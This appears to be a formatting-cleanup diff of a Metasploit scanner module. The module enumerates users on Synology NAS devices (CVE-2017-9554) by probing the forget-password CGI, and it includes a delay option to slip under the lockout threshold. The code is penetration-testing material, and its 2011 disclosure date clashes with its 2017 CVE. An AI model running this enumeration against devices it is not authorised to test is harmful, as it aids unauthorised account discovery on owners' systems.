@@ -9,45 +9,52 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'Synology Forget Password  User Enumeration Scanner',
-      'Description'    => %q{
-        This module attempts to enumerate users on the Synology NAS
-        by sending GET requests for the forgot password URL.
-        The Synology NAS will respond differently if a user is present or not.
-        These count as login attempts, and the default is 10 logins in 5min to
-        get a permanent block.  Set delay accordingly to avoid this, as default
-        is permanent.
-        Vulnerable DSMs are:
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Synology Forget Password  User Enumeration Scanner',
+        'Description' => %q{
+          This module attempts to enumerate users on the Synology NAS
+          by sending GET requests for the forgot password URL.
+          The Synology NAS will respond differently if a user is present or not.
+          These count as login attempts, and the default is 10 logins in 5min to
+          get a permanent block.  Set delay accordingly to avoid this, as default
+          is permanent.
+          Vulnerable DSMs are:
           DSM 6.1 < 6.1.3-15152
           DSM 6.0 < 6.0.3-8754-4
           DSM 5.2 < 5.2-5967-04
-      },
-      'Author'         => [
-        'h00die', # msf module
-        'Steve Kaun' # POC
-      ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          [ 'EDB', '43455' ],
-          [ 'CVE', '2017-9554' ],
-          [ 'URL', 'https://www.synology.com/en-global/security/advisory/Synology_SA_17_29_DSM' ]
+        },
+        'Author' => [
+          'h00die', # msf module
+          'Steve Kaun' # POC
         ],
-      'DisclosureDate' => 'Jan 5 2011'))
+        'License' => MSF_LICENSE,
+        'References' =>
+          [
+            [ 'EDB', '43455' ],
+            [ 'CVE', '2017-9554' ],
+            [ 'URL', 'https://www.synology.com/en-global/security/advisory/Synology_SA_17_29_DSM' ]
+          ],
+        'DisclosureDate' => 'Jan 5 2011'
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(5000),
         OptString.new('TARGETURI', [true, 'The path to users Synology Web Interface', '/']),
-        OptPath.new('USER_FILE', [false, 'File containing users, one per line',
-          File.join(Msf::Config.data_directory, 'wordlists', "unix_users.txt")]),
+        OptPath.new('USER_FILE', [
+          false, 'File containing users, one per line',
+          File.join(Msf::Config.data_directory, 'wordlists', 'unix_users.txt')
+        ]),
         OptInt.new('DELAY', [true, 'Seconds delay to add to avoid lockout', 31])
-      ])
+      ]
+    )
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     @users_found = {}
 
     unless File.readable?(datastore['USER_FILE'])
@@ -57,22 +64,22 @@ class MetasploitModule < Msf::Auxiliary
     users.each do |user|
       do_enum(user)
       vprint_status("Delaying #{datastore['DELAY']}s") if datastore['DELAY'] > 0 # dont flood the prompt
-      Rex::sleep(datastore['DELAY'])
+      Rex.sleep(datastore['DELAY'])
     end
 
-    if(@users_found.empty?)
+    if @users_found.empty?
       print_status("#{full_uri} - No users found.")
     else
-      print_good("#{full_uri} - Users found: #{@users_found.keys.sort.join(", ")}")
+      print_good("#{full_uri} - Users found: #{@users_found.keys.sort.join(', ')}")
       report_note(
-      :host => rhost,
-      :port => rport,
-      :proto => 'tcp',
-      :sname => (ssl ? 'https' : 'http'),
-      :type => 'users',
-      :vhost => vhost,
-      :data => {:users =>  @users_found.keys.join(", ")}
-    )
+        host: rhost,
+        port: rport,
+        proto: 'tcp',
+        sname: (ssl ? 'https' : 'http'),
+        type: 'users',
+        vhost: vhost,
+        data: { users: @users_found.keys.join(', ') }
+      )
     end
   end
 
@@ -88,7 +95,7 @@ class MetasploitModule < Msf::Auxiliary
     credential_data = {
       origin_type: :service,
       module_fullname: fullname,
-      username: opts[:user],
+      username: opts[:user]
     }.merge(service_data)
 
     login_data = {
@@ -102,12 +109,10 @@ class MetasploitModule < Msf::Auxiliary
 
   def do_enum(username)
     begin
-      uri = normalize_uri(target_uri.path)
-
       vprint_status("Attempting #{username}")
       res = send_request_cgi({
         'uri' => normalize_uri(target_uri.path, 'webman', 'forget_passwd.cgi'),
-        'method'  => 'GET',
+        'method' => 'GET',
         'vars_get' => {
           'user' => username
         }
